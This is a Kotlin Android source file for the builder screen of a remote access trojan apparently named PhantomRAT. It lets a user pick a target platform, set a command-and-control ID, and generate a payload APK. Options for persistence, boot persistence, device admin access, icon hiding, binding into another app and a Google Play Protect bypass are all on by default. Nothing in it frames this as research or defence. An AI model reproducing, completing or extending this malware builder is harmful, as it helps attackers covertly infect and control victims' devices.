package com.phantom.rat.ui

import android.content.ContentValues
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.fragment.app.Fragment
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.android.material.card.MaterialCardView
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.progressindicator.LinearProgressIndicator
import com.google.android.material.snackbar.Snackbar
import com.google.android.material.switchmaterial.SwitchMaterial
import com.google.android.material.textfield.TextInputEditText
import com.google.android.material.textfield.TextInputLayout
import com.phantom.rat.R
import com.phantom.rat.payload.PayloadBuilder
import com.phantom.rat.core.Crypto
import kotlinx.coroutines.*

class BuilderFragment : Fragment() {

    private var selectedPlatform = "android"
    private lateinit var progressIndicator: LinearProgressIndicator
    private lateinit var btnGenerate: MaterialButton
    private lateinit var scrollView: ScrollView
    private var buildJob: Job? = null

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        return inflater.inflate(R.layout.fragment_builder, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        
        progressIndicator = view.findViewById(R.id.progressIndicator)
        btnGenerate = view.findViewById(R.id.btnGeneratePayload)
        scrollView = view.findViewById(R.id.scrollView)
        
        setupPlatformCards(view)
        setupOptions(view)
        setupGenerateButton(view)
    }

    private fun setupPlatformCards(view: View) {
        val platformCards = mapOf(
            R.id.cardAndroid to "android",
            R.id.cardWindows to "windows", 
            R.id.cardLinux to "linux",
            R.id.cardMac to "mac"
        )

        platformCards.forEach { (cardId, platform) ->
            view.findViewById<MaterialCardView>(cardId).setOnClickListener {
                selectPlatform(view, platform, platformCards.keys.toList())
            }
        }

        // Default selection
        selectPlatform(view, "android", platformCards.keys.toList())
    }

    private fun selectPlatform(view: View, platform: String, cardIds: List<Int>) {
        selectedPlatform = platform
        cardIds.forEach { id ->
            view.findViewById<MaterialCardView>(id).strokeWidth = 
                if (view.findViewById<MaterialCardView>(id).tag == platform) 4 else 1
        }
        
        // Show platform-specific options
        view.findViewById<LinearLayout>(R.id.layoutAndroidOptions).visibility = 
            if (platform == "android") View.VISIBLE else View.GONE
        view.findViewById<LinearLayout>(R.id.layoutDesktopOptions).visibility = 
            if (platform != "android") View.VISIBLE else View.GONE
    }

    private fun setupOptions(view: View) {
        // Bind icon switch
        view.findViewById<SwitchMaterial>(R.id.switchBindIcon).setOnCheckedChangeListener { _, isChecked ->
            view.findViewById<LinearLayout>(R.id.layoutIconPicker).visibility = 
                if (isChecked) View.VISIBLE else View.GONE
        }

        // Persistence options
        view.findViewById<SwitchMaterial>(R.id.switchPersistence).isChecked = true
        view.findViewById<SwitchMaterial>(R.id.switchBootPersistence).isChecked = true
        view.findViewById<SwitchMaterial>(R.id.switchAdminAccess).isChecked = true
        view.findViewById<SwitchMaterial>(R.id.switchHideIcon).isChecked = true
        view.findViewById<SwitchMaterial>(R.id.switchPlayProtectBypass).isChecked = true
    }

    private fun setupGenerateButton(view: View) {
        btnGenerate.setOnClickListener {
            if (buildJob?.isActive == true) return@setOnClickListener
            
            MaterialAlertDialogBuilder(requireContext())
                .setTitle("🧬 تأكيد الإنشاء")
                .setMessage("سيتم إنشاء بايلود $selectedPlatform متطور مع كل الإمكانيات")
                .setPositiveButton("✅ إنشاء") { _, _ -> startBuild(view) }
                .setNegativeButton("إلغاء", null)
                .show()
        }
    }

    private fun startBuild(view: View) {
        progressIndicator.visibility = View.VISIBLE
        progressIndicator.progress = 0
        btnGenerate.isEnabled = false
        btnGenerate.text = "جاري الإنشاء..."
        
        val c2Id = view.findViewById<TextInputEditText>(R.id.etC2Id).text.toString()
            .ifEmpty { sessionManager.getDeviceId() }
        
        val bindApkPath = if (view.findViewById<SwitchMaterial>(R.id.switchBindIcon).isChecked) {
            view.findViewById<TextInputEditText>(R.id.etIconPath).text.toString()
        } else null

        buildJob = CoroutineScope(Dispatchers.IO).launch {
            try {
                val payloadBuilder = PayloadBuilder(requireContext())
                
                withContext(Dispatchers.Main) { progressIndicator.progress = 20 }
                
                val result = payloadBuilder.buildPayload(
                    platform = selectedPlatform,
                    c2Id = c2Id,
                    bindApk = bindApkPath,
                    hideIcon = view.findViewById<SwitchMaterial>(R.id.switchHideIcon).isChecked,
                    persistence = view.findViewById<SwitchMaterial>(R.id.switchPersistence).isChecked,
                    bootPersistence = view.findViewById<SwitchMaterial>(R.id.switchBootPersistence).isChecked,
                    adminAccess = view.findViewById<SwitchMaterial>(R.id.switchAdminAccess).isChecked,
                    playProtectBypass = view.findViewById<SwitchMaterial>(R.id.switchPlayProtectBypass).isChecked
                )
                
                withContext(Dispatchers.Main) { progressIndicator.progress = 100 }
                
                if (result.success) {
                    saveApkToSdcard(result.filePath, view)
                } else {
                    withContext(Dispatchers.Main) {
                        Snackbar.make(view, "❌ فشل: ${result.error}", Snackbar.LENGTH_LONG).show()
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Snackbar.make(view, "❌ خطأ: ${e.message}", Snackbar.LENGTH_LONG).show()
                }
            } finally {
                withContext(Dispatchers.Main) {
                    progressIndicator.visibility = View.GONE
                    btnGenerate.isEnabled = true
                    btnGenerate.text = "🚀 إنشاء البايلود"
                }
            }
        }
    }

    private fun saveApkToSdcard(sourcePath: String, view: View) {
        try {
            val fileName = "PhantomRAT_${selectedPlatform}_${System.currentTimeMillis()}.apk"
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE, "application/vnd.android.package-archive")
                    put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }
                
                val uri = requireContext().contentResolver.insert(
                    MediaStore.Downloads.EXTERNAL_CONTENT_URI, values
                )
                
                uri?.let {
                    val inputStream = java.io.File(sourcePath).inputStream()
                    requireContext().contentResolver.openOutputStream(it)?.use { output ->
                        inputStream.copyTo(output)
                    }
                    inputStream.close()
                }
            } else {
                val destPath = Environment.getExternalStorageDirectory().absolutePath + 
                    "/Download/$fileName"
                java.io.File(sourcePath).copyTo(java.io.File(destPath), overwrite = true)
            }

            requireActivity().runOnUiThread {
                Snackbar.make(view, "✅ تم حفظ البايلود في sdcard/Download/$fileName", 
                    Snackbar.LENGTH_LONG).show()
                
                MaterialAlertDialogBuilder(requireContext())
                    .setTitle("✅ تم الإنشاء بنجاح!")
                    .setMessage("البايلود: $fileName\nالنظام: $selectedPlatform\nالحجم: ${java.io.File(sourcePath).length() / 1024} KB\nالمسار: sdcard/Download/")
                    .setPositiveButton("👍 حسناً", null)
                    .show()
            }
        } catch (e: Exception) {
            requireActivity().runOnUiThread {
                Snackbar.make(view, "❌ خطأ في الحفظ: ${e.message}", Snackbar.LENGTH_LONG).show()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        buildJob?.cancel()
    }
}
